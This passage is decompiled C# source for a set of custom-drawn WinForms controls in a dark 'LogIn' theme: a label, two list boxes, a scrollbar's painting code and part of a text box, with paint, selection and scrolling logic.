				int arg_242_0_cp_1 = 8;
				Point point9 = new Point(13, (int)Math.Round(unchecked((double)this.Height / 2.0 + 2.0)));
				arg_242_0_cp_0[arg_242_0_cp_1] = point9;
				Point[] arg_285_0_cp_0 = array;
				int arg_285_0_cp_1 = 9;
				Point point10 = new Point(13, (int)Math.Round(unchecked((double)this.Height - (double)this.Height / 4.0 - 1.0)));
				arg_285_0_cp_0[arg_285_0_cp_1] = point10;
				Point[] points = array;
				graphics2.FillPolygon(new SolidBrush(this._ArrowColour), points);
				graphics2.FillRectangle(new SolidBrush(this._ThumbColour), this.Thumb);
				graphics2.DrawRectangle(new Pen(this._ThumbBorder), this.Thumb);
				graphics2.DrawRectangle(new Pen(this._ThumbSecondBorder), this.Thumb.X + 1, this.Thumb.Y + 1, this.Thumb.Width - 2, this.Thumb.Height - 2);
				Graphics arg_3A1_0 = graphics2;
				Pen arg_3A1_1 = new Pen(this._LineColour, 2f);
				point10 = new Point(this.Thumb.X + 4, (int)Math.Round(unchecked((double)this.Thumb.Height / 2.0 + 1.0)));
				Point arg_3A1_2 = point10;
				point9 = new Point(this.Thumb.Right - 4, (int)Math.Round(unchecked((double)this.Thumb.Height / 2.0 + 1.0)));
				arg_3A1_0.DrawLine(arg_3A1_1, arg_3A1_2, point9);
				graphics2.DrawRectangle(new Pen(this._FirstBorder), 0, 0, this.Width - 1, this.Height - 1);
				graphics2.DrawRectangle(new Pen(this._SecondBorder), 1, 1, this.Width - 3, this.Height - 3);
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInLabel : Label
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private Color _FontColour;

		[Category("Colours")]
		public Color FontColour
		{
			get
			{
				return this._FontColour;
			}
			set
			{
				this._FontColour = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInLabel.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInLabel.__ENCList.Count == LogInLabel.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInLabel.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInLabel.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInLabel.__ENCList[num] = LogInLabel.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInLabel.__ENCList.RemoveRange(num, LogInLabel.__ENCList.Count - num);
						LogInLabel.__ENCList.Capacity = LogInLabel.__ENCList.Count;
					}
					LogInLabel.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnTextChanged(EventArgs e)
		{
			base.OnTextChanged(e);
			this.Invalidate();
		}

		public LogInLabel()
		{
			LogInLabel.__ENCAddToList(this);
			this._FontColour = Color.FromArgb(255, 255, 255);
			this.SetStyle(ControlStyles.SupportsTransparentBackColor, true);
			this.Font = new Font("Segoe UI", 9f);
			this.ForeColor = this._FontColour;
			this.BackColor = Color.Transparent;
			this.Text = this.Text;
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInListBox : Control
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		[AccessedThroughProperty("ListB")]
		private ListBox _ListB;

		private string[] _Items;

		private Color _BaseColour;

		private Color _SelectedColour;

		private Color _ListBaseColour;

		private Color _TextColour;

		private Color _BorderColour;

		private virtual ListBox ListB
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ListB;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				DrawItemEventHandler value2 = new DrawItemEventHandler(this.Drawitem);
				bool flag = this._ListB != null;
				if (flag)
				{
					this._ListB.DrawItem -= value2;
				}
				this._ListB = value;
				flag = (this._ListB != null);
				if (flag)
				{
					this._ListB.DrawItem += value2;
				}
			}
		}

		[Category("Control")]
		public string[] Items
		{
			get
			{
				return this._Items;
			}
			set
			{
				this._Items = value;
				this.ListB.Items.Clear();
				this.ListB.Items.AddRange(value);
				this.Invalidate();
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color SelectedColour
		{
			get
			{
				return this._SelectedColour;
			}
			set
			{
				this._SelectedColour = value;
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color ListBaseColour
		{
			get
			{
				return this._ListBaseColour;
			}
			set
			{
				this._ListBaseColour = value;
			}
		}

		[Category("Colours")]
		public Color TextColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
			}
		}

		public string SelectedItem
		{
			get
			{
				return Conversions.ToString(this.ListB.SelectedItem);
			}
		}

		public int SelectedIndex
		{
			get
			{
				return this.ListB.SelectedIndex;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInListBox.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInListBox.__ENCList.Count == LogInListBox.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInListBox.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInListBox.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInListBox.__ENCList[num] = LogInListBox.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInListBox.__ENCList.RemoveRange(num, LogInListBox.__ENCList.Count - num);
						LogInListBox.__ENCList.Capacity = LogInListBox.__ENCList.Count;
					}
					LogInListBox.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		public void Clear()
		{
			this.ListB.Items.Clear();
		}

		public void ClearSelected()
		{
			checked
			{
				int num = this.ListB.SelectedItems.Count - 1;
				while (true)
				{
					int arg_46_0 = num;
					int num2 = 0;
					if (arg_46_0 < num2)
					{
						break;
					}
					this.ListB.Items.Remove(RuntimeHelpers.GetObjectValue(this.ListB.SelectedItems[num]));
					num += -1;
				}
			}
		}

		protected override void OnCreateControl()
		{
			base.OnCreateControl();
			bool flag = !this.Controls.Contains(this.ListB);
			if (flag)
			{
				this.Controls.Add(this.ListB);
			}
		}

		public void AddRange(object[] items)
		{
			this.ListB.Items.Remove("");
			this.ListB.Items.AddRange(items);
		}

		public void AddItem(object item)
		{
			this.ListB.Items.Remove("");
			this.ListB.Items.Add(RuntimeHelpers.GetObjectValue(item));
		}

		public void Drawitem(object sender, DrawItemEventArgs e)
		{
			bool flag = e.Index < 0;
			checked
			{
				if (!flag)
				{
					e.DrawBackground();
					e.DrawFocusRectangle();
					Graphics graphics = e.Graphics;
					graphics.SmoothingMode = SmoothingMode.HighQuality;
					graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;
					graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
					graphics.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
					flag = (Strings.InStr(e.State.ToString(), "Selected,", CompareMethod.Binary) > 0);
					if (flag)
					{
						Graphics arg_C3_0 = graphics;
						Brush arg_C3_1 = new SolidBrush(this._SelectedColour);
						int arg_BB_1 = e.Bounds.X;
						int arg_BB_2 = e.Bounds.Y;
						int arg_BB_3 = e.Bounds.Width;
						Rectangle bounds = e.Bounds;
						Rectangle bounds2 = new Rectangle(arg_BB_1, arg_BB_2, arg_BB_3, bounds.Height - 1);
						arg_C3_0.FillRectangle(arg_C3_1, bounds2);
						Graphics arg_12B_0 = graphics;
						string arg_12B_1 = " " + this.ListB.Items[e.Index].ToString();
						Font arg_12B_2 = new Font("Segoe UI", 9f, FontStyle.Bold);
						Brush arg_12B_3 = new SolidBrush(this._TextColour);
						bounds = e.Bounds;
						float arg_12B_4 = (float)bounds.X;
						bounds2 = e.Bounds;
						arg_12B_0.DrawString(arg_12B_1, arg_12B_2, arg_12B_3, arg_12B_4, (float)(bounds2.Y + 2));
					}
					else
					{
						Graphics arg_186_0 = graphics;
						Brush arg_186_1 = new SolidBrush(this._ListBaseColour);
						Rectangle bounds2 = e.Bounds;
						Rectangle bounds = new Rectangle(bounds2.X, e.Bounds.Y, e.Bounds.Width, e.Bounds.Height);
						arg_186_0.FillRectangle(arg_186_1, bounds);
						Graphics arg_1ED_0 = graphics;
						string arg_1ED_1 = " " + this.ListB.Items[e.Index].ToString();
						Font arg_1ED_2 = new Font("Segoe UI", 8f);
						Brush arg_1ED_3 = new SolidBrush(this._TextColour);
						bounds = e.Bounds;
						float arg_1ED_4 = (float)bounds.X;
						bounds2 = e.Bounds;
						arg_1ED_0.DrawString(arg_1ED_1, arg_1ED_2, arg_1ED_3, arg_1ED_4, (float)(bounds2.Y + 2));
					}
					graphics.Dispose();
				}
			}
		}

		public LogInListBox()
		{
			LogInListBox.__ENCAddToList(this);
			this.ListB = new ListBox();
			this._Items = new string[]
			{
				""
			};
			this._BaseColour = Color.FromArgb(42, 42, 42);
			this._SelectedColour = Color.FromArgb(55, 55, 55);
			this._ListBaseColour = Color.FromArgb(47, 47, 47);
			this._TextColour = Color.FromArgb(255, 255, 255);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.ListB.DrawMode = DrawMode.OwnerDrawFixed;
			this.ListB.ScrollAlwaysVisible = false;
			this.ListB.HorizontalScrollbar = false;
			this.ListB.BorderStyle = BorderStyle.None;
			this.ListB.BackColor = this._BaseColour;
			Control arg_FF_0 = this.ListB;
			Point location = new Point(3, 3);
			arg_FF_0.Location = location;
			this.ListB.Font = new Font("Segoe UI", 8f);
			this.ListB.ItemHeight = 20;
			this.ListB.Items.Clear();
			this.ListB.IntegralHeight = false;
			Size size = new Size(130, 100);
			this.Size = size;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Rectangle rect = new Rectangle(0, 0, this.Width, this.Height);
			Graphics graphics2 = graphics;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.Clear(this.BackColor);
			Control arg_65_0 = this.ListB;
			checked
			{
				Size size = new Size(this.Width - 6, this.Height - 5);
				arg_65_0.Size = size;
				graphics2.FillRectangle(new SolidBrush(this._BaseColour), rect);
				Graphics arg_A9_0 = graphics2;
				Pen arg_A9_1 = new Pen(this._BorderColour, 3f);
				Rectangle rect2 = new Rectangle(0, 0, this.Width, this.Height - 1);
				arg_A9_0.DrawRectangle(arg_A9_1, rect2);
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInListBoxWBuiltInScrollBar : Control
	{
		public class LogInListBoxItem
		{
			[DebuggerBrowsable(DebuggerBrowsableState.Never), CompilerGenerated]
			private string _Text;

			public string Text
			{
				[DebuggerNonUserCode]
				get
				{
					return this._Text;
				}
				[DebuggerNonUserCode]
				set
				{
					this._Text = value;
				}
			}

			[DebuggerNonUserCode]
			public LogInListBoxItem()
			{
			}

			public override string ToString()
			{
				return this.Text;
			}
		}

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private List<LogInListBoxWBuiltInScrollBar.LogInListBoxItem> _Items;

		private readonly List<LogInListBoxWBuiltInScrollBar.LogInListBoxItem> _SelectedItems;

		private bool _MultiSelect;

		private int ItemHeight;

		private readonly LogInVerticalScrollBar VerticalScrollbar;

		private Color _BaseColour;

		private Color _SelectedItemColour;

		private Color _NonSelectedItemColour;

		private Color _BorderColour;

		private Color _TextColour;

		private int _SelectedHeight;

		[Category("Colours")]
		public Color TextColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
			}
		}

		[Category("Control")]
		public int SelectedHeight
		{
			get
			{
				return this._SelectedHeight;
			}
			set
			{
				bool flag = value < 1;
				if (flag)
				{
					this._SelectedHeight = this.Height;
				}
				else
				{
					this._SelectedHeight = value;
				}
				this.InvalidateScroll();
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color SelectedItemColour
		{
			get
			{
				return this._SelectedItemColour;
			}
			set
			{
				this._SelectedItemColour = value;
			}
		}

		[Category("Colours")]
		public Color NonSelectedItemColour
		{
			get
			{
				return this._NonSelectedItemColour;
			}
			set
			{
				this._NonSelectedItemColour = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[DesignerSerializationVisibility(DesignerSerializationVisibility.Content)]
		public LogInListBoxWBuiltInScrollBar.LogInListBoxItem[] Items
		{
			get
			{
				return this._Items.ToArray();
			}
			set
			{
				this._Items = new List<LogInListBoxWBuiltInScrollBar.LogInListBoxItem>(value);
				this.Invalidate();
				this.InvalidateScroll();
			}
		}

		public LogInListBoxWBuiltInScrollBar.LogInListBoxItem[] SelectedItems
		{
			get
			{
				return this._SelectedItems.ToArray();
			}
		}

		public bool MultiSelect
		{
			get
			{
				return this._MultiSelect;
			}
			set
			{
				this._MultiSelect = value;
				bool flag = this._SelectedItems.Count > 1;
				if (flag)
				{
					this._SelectedItems.RemoveRange(1, checked(this._SelectedItems.Count - 1));
				}
				this.Invalidate();
			}
		}

		public override Font Font
		{
			get
			{
				return base.Font;
			}
			set
			{
				this.ItemHeight = checked((int)Math.Round((double)Graphics.FromHwnd(this.Handle).MeasureString("@", this.Font).Height));
				bool flag = this.VerticalScrollbar != null;
				if (flag)
				{
					this.VerticalScrollbar._SmallChange = 1;
					this.VerticalScrollbar._LargeChange = 1;
				}
				base.Font = value;
				this.InvalidateLayout();
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInListBoxWBuiltInScrollBar.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInListBoxWBuiltInScrollBar.__ENCList.Count == LogInListBoxWBuiltInScrollBar.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInListBoxWBuiltInScrollBar.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInListBoxWBuiltInScrollBar.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInListBoxWBuiltInScrollBar.__ENCList[num] = LogInListBoxWBuiltInScrollBar.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInListBoxWBuiltInScrollBar.__ENCList.RemoveRange(num, LogInListBoxWBuiltInScrollBar.__ENCList.Count - num);
						LogInListBoxWBuiltInScrollBar.__ENCList.Capacity = LogInListBoxWBuiltInScrollBar.__ENCList.Count;
					}
					LogInListBoxWBuiltInScrollBar.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		private void HandleScroll(object sender)
		{
			this.Invalidate();
		}

		private void InvalidateScroll()
		{
			Debug.Print(Conversions.ToString(this.Height));
			checked
			{
				bool flag = (double)((int)Math.Round(Math.Round((double)(this._Items.Count * this.ItemHeight) / (double)this._SelectedHeight))) < (double)(this._Items.Count * this.ItemHeight) / (double)this._SelectedHeight;
				if (flag)
				{
					this.VerticalScrollbar._Maximum = (int)Math.Round(Math.Ceiling((double)(this._Items.Count * this.ItemHeight) / (double)this._SelectedHeight));
				}
				else
				{
					flag = ((int)Math.Round(Math.Round((double)(this._Items.Count * this.ItemHeight) / (double)this._SelectedHeight)) == 0);
					if (flag)
					{
						this.VerticalScrollbar._Maximum = 1;
					}
					else
					{
						this.VerticalScrollbar._Maximum = (int)Math.Round(Math.Round((double)(this._Items.Count * this.ItemHeight) / (double)this._SelectedHeight));
					}
				}
				this.Invalidate();
			}
		}

		private void InvalidateLayout()
		{
			Control arg_25_0 = this.VerticalScrollbar;
			checked
			{
				Point location = new Point(this.Width - this.VerticalScrollbar.Width - 2, 2);
				arg_25_0.Location = location;
				Control arg_44_0 = this.VerticalScrollbar;
				Size size = new Size(18, this.Height - 4);
				arg_44_0.Size = size;
				this.Invalidate();
			}
		}

		public void AddItem(string Items)
		{
			LogInListBoxWBuiltInScrollBar.LogInListBoxItem logInListBoxItem = new LogInListBoxWBuiltInScrollBar.LogInListBoxItem();
			logInListBoxItem.Text = Items;
			this._Items.Add(logInListBoxItem);
			this.Invalidate();
			this.InvalidateScroll();
		}

		public void AddItems(string[] Items)
		{
			checked
			{
				for (int i = 0; i < Items.Length; i++)
				{
					string text = Items[i];
					LogInListBoxWBuiltInScrollBar.LogInListBoxItem logInListBoxItem = new LogInListBoxWBuiltInScrollBar.LogInListBoxItem();
					logInListBoxItem.Text = text;
					this._Items.Add(logInListBoxItem);
				}
				this.Invalidate();
				this.InvalidateScroll();
			}
		}

		public void RemoveItemAt(int index)
		{
			this._Items.RemoveAt(index);
			this.Invalidate();
			this.InvalidateScroll();
		}

		public void RemoveItem(LogInListBoxWBuiltInScrollBar.LogInListBoxItem item)
		{
			this._Items.Remove(item);
			this.Invalidate();
			this.InvalidateScroll();
		}

		public void RemoveItems(LogInListBoxWBuiltInScrollBar.LogInListBoxItem[] items)
		{
			checked
			{
				for (int i = 0; i < items.Length; i++)
				{
					LogInListBoxWBuiltInScrollBar.LogInListBoxItem item = items[i];
					this._Items.Remove(item);
				}
				this.Invalidate();
				this.InvalidateScroll();
			}
		}

		protected override void OnSizeChanged(EventArgs e)
		{
			this._SelectedHeight = this.Height;
			this.InvalidateScroll();
			this.InvalidateLayout();
			base.OnSizeChanged(e);
		}

		private void Vertical_MouseDown(object sender, MouseEventArgs e)
		{
			this.Focus();
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			this.Focus();
			bool flag = e.Button == MouseButtons.Left;
			checked
			{
				if (flag)
				{
					int num = this.VerticalScrollbar.Value * (this.VerticalScrollbar.Maximum + (this.Height - this.ItemHeight));
					int num2 = (e.Y + num) / this.ItemHeight;
					flag = (num2 > this._Items.Count - 1);
					if (flag)
					{
						num2 = -1;
					}
					flag = (num2 != -1);
					if (flag)
					{
						bool flag2 = Control.ModifierKeys == Keys.Control && this._MultiSelect;
						if (flag2)
						{
							bool flag3 = this._SelectedItems.Contains(this._Items[num2]);
							if (flag3)
							{
								this._SelectedItems.Remove(this._Items[num2]);
							}
							else
							{
								this._SelectedItems.Add(this._Items[num2]);
							}
						}
						else
						{
							this._SelectedItems.Clear();
							this._SelectedItems.Add(this._Items[num2]);
						}
						Debug.Print(this._SelectedItems[0].Text);
					}
					this.Invalidate();
				}
				base.OnMouseDown(e);
			}
		}

		protected override void OnMouseWheel(MouseEventArgs e)
		{
			checked
			{
				int num = 0 - e.Delta * SystemInformation.MouseWheelScrollLines / 120 * 1;
				int value = Math.Max(Math.Min(this.VerticalScrollbar.Value + num, this.VerticalScrollbar.Maximum), this.VerticalScrollbar.Minimum);
				this.VerticalScrollbar.Value = value;
				base.OnMouseWheel(e);
			}
		}

		public LogInListBoxWBuiltInScrollBar()
		{
			LogInListBoxWBuiltInScrollBar.__ENCAddToList(this);
			this._Items = new List<LogInListBoxWBuiltInScrollBar.LogInListBoxItem>();
			this._SelectedItems = new List<LogInListBoxWBuiltInScrollBar.LogInListBoxItem>();
			this._MultiSelect = true;
			this.ItemHeight = 24;
			this._BaseColour = Color.FromArgb(55, 55, 55);
			this._SelectedItemColour = Color.FromArgb(50, 50, 50);
			this._NonSelectedItemColour = Color.FromArgb(47, 47, 47);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this._TextColour = Color.FromArgb(255, 255, 255);
			this._SelectedHeight = 1;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.Selectable | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.VerticalScrollbar = new LogInVerticalScrollBar();
			this.VerticalScrollbar._SmallChange = 1;
			this.VerticalScrollbar._LargeChange = 1;
			this.VerticalScrollbar.Scroll += new LogInVerticalScrollBar.ScrollEventHandler(this.HandleScroll);
			this.VerticalScrollbar.MouseDown += new MouseEventHandler(this.Vertical_MouseDown);
			this.Controls.Add(this.VerticalScrollbar);
			this.InvalidateLayout();
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(this._BaseColour);
			checked
			{
				int num = this.VerticalScrollbar.Value * (this.VerticalScrollbar.Maximum + (this.Height - this.ItemHeight));
				bool flag = num == 0;
				int num2;
				if (flag)
				{
					num2 = 0;
				}
				else
				{
					num2 = num / this.ItemHeight / this.VerticalScrollbar.Maximum;
				}
				int num3 = Math.Min(num2 + this.Height / this.ItemHeight, this._Items.Count - 1);
				graphics2.DrawLine(new Pen(this._BorderColour, 2f), this.VerticalScrollbar.Location.X - 1, 0, this.VerticalScrollbar.Location.X - 1, this.Height);
				int arg_FF_0 = num2;
				int num4 = this._Items.Count - 1;
				int num5 = arg_FF_0;
				while (true)
				{
					int arg_25F_0 = num5;
					int num6 = num4;
					if (arg_25F_0 > num6)
					{
						break;
					}
					LogInListBoxWBuiltInScrollBar.LogInListBoxItem logInListBoxItem = this.Items[num5];
					int num7 = num5 * this.ItemHeight + 1 - num + (int)Math.Round(unchecked((double)this.ItemHeight / 2.0 - 8.0));
					flag = this._SelectedItems.Contains(logInListBoxItem);
					if (flag)
					{
						Graphics arg_189_0 = graphics2;
						Brush arg_189_1 = new SolidBrush(this._SelectedItemColour);
						Rectangle rect = new Rectangle(0, num5 * this.ItemHeight + 1 - num, this.Width - 19, this.ItemHeight - 1);
						arg_189_0.FillRectangle(arg_189_1, rect);
					}
					else
					{
						Graphics arg_1C8_0 = graphics2;
						Brush arg_1C8_1 = new SolidBrush(this._NonSelectedItemColour);
						Rectangle rect = new Rectangle(0, num5 * this.ItemHeight + 1 - num, this.Width - 19, this.ItemHeight - 1);
						arg_1C8_0.FillRectangle(arg_1C8_1, rect);
					}
					graphics2.DrawLine(new Pen(this._BorderColour), 0, num5 * this.ItemHeight + 1 - num + this.ItemHeight - 1, this.Width - 18, num5 * this.ItemHeight + 1 - num + this.ItemHeight - 1);
					graphics2.DrawString(logInListBoxItem.Text, new Font("Segoe UI", 8f), new SolidBrush(this._TextColour), 9f, (float)num7);
					graphics2.ResetClip();
					num5++;
				}
				graphics2.DrawRectangle(new Pen(Color.FromArgb(35, 35, 35), 2f), 1, 1, this.Width - 2, this.Height - 2);
				graphics2.DrawLine(new Pen(this._BorderColour, 2f), this.VerticalScrollbar.Location.X - 1, 0, this.VerticalScrollbar.Location.X - 1, this.Height);
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInNormalTextBox : Control
	{
		public enum Styles
		{
			Rounded,
			NotRounded
		}

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private MouseState State;

		[AccessedThroughProperty("TB")]
		private TextBox _TB;

		private Color _BaseColour;

		private Color _TextColour;

		private Color _BorderColour;

		private LogInNormalTextBox.Styles _Style;

		private HorizontalAlignment _TextAlign;

		private int _MaxLength;

		private bool _ReadOnly;

		private bool _UseSystemPasswordChar;

		private bool _Multiline;

		private virtual TextBox TB
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TB;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TB = value;
			}
		}

		[Category("Options")]
		public HorizontalAlignment TextAlign
		{
			get
			{
				return this._TextAlign;
			}
			set
			{
				this._TextAlign = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.TextAlign = value;
				}
			}
		}

		[Category("Options")]
		public int MaxLength
		{
			get
			{
				return this._MaxLength;
			}
			set
			{
				this._MaxLength = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.MaxLength = value;
				}
			}
		}

		[Category("Options")]
		public bool ReadOnly
		{
			get
			{
				return this._ReadOnly;
			}
			set
			{
				this._ReadOnly = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.ReadOnly = value;
				}
			}
		}

		[Category("Options")]
		public bool UseSystemPasswordChar
		{
			get
			{
				return this._UseSystemPasswordChar;
			}
			set
			{
				this._UseSystemPasswordChar = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.UseSystemPasswordChar = value;
				}
			}
		}

		[Category("Options")]
		public bool Multiline
		{
			get
			{
				return this._Multiline;
			}
			set
			{
				this._Multiline = value;
				bool flag = this.TB != null;
				checked
				{
					if (flag)
					{
						this.TB.Multiline = value;
						if (value)
						{
							this.TB.Height = this.Height - 11;
						}
						else
						{
							this.Height = this.TB.Height + 11;
						}
					}
				}
			}
		}

		[Category("Options")]
		public override string Text
		{
			get
			{
				return base.Text;
			}
			set
			{
				base.Text = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.Text = value;
				}
			}
		}

		[Category("Options")]
		public override Font Font
		{
			get
			{
				return base.Font;
			}
			set
			{
				base.Font = value;
				bool flag = this.TB != null;
				checked
				{
					if (flag)
					{
						this.TB.Font = value;
						Control arg_37_0 = this.TB;
						Point location = new Point(3, 5);
						arg_37_0.Location = location;
						this.TB.Width = this.Width - 6;
						flag = !this._Multiline;
						if (flag)
						{
							this.Height = this.TB.Height + 11;
						}
					}
				}
			}
		}

		public LogInNormalTextBox.Styles Style
		{
			get
			{
				return this._Style;
			}
			set
			{
				this._Style = value;
			}
		}

		[Category("Colours")]
		public Color BackgroundColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color TextColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInNormalTextBox.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInNormalTextBox.__ENCList.Count == LogInNormalTextBox.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInNormalTextBox.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInNormalTextBox.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInNormalTextBox.__ENCList[num] = LogInNormalTextBox.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInNormalTextBox.__ENCList.RemoveRange(num, LogInNormalTextBox.__ENCList.Count - num);
						LogInNormalTextBox.__ENCList.Capacity = LogInNormalTextBox.__ENCList.Count;
					}
					LogInNormalTextBox.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnCreateControl()
		{
			base.OnCreateControl();
			bool flag = !this.Controls.Contains(this.TB);
			if (flag)
			{
				this.Controls.Add(this.TB);
			}
		}

		private void OnBaseTextChanged(object s, EventArgs e)
		{
			this.Text = this.TB.Text;
		}

		private void OnBaseKeyDown(object s, KeyEventArgs e)
		{
			bool flag = e.Control && e.KeyCode == Keys.A;
			if (flag)
			{
				this.TB.SelectAll();
				e.SuppressKeyPress = true;
			}
			flag = (e.Control && e.KeyCode == Keys.C);
			if (flag)
			{
				this.TB.Copy();
				e.SuppressKeyPress = true;
			}
		}

		protected override void OnResize(EventArgs e)
		{
			Control arg_12_0 = this.TB;
			Point location = new Point(5, 5);
			arg_12_0.Location = location;
			checked
			{
